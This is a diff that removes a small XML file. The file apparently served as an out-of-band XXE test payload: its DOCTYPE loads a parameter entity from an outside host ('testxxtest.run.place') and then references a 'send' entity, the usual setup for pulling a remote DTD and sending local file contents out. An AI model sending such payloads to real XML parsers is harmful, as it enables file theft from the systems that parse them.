@@ -1,7 +1,0 @@
-<?xml version="1.0"?>
-<!DOCTYPE root [
-  <!ELEMENT root ANY>
-  <!ENTITY % foo SYSTEM "http://testxxtest.run.place/fuck">
-  %foo;
-]>
-<a>&send;</a>
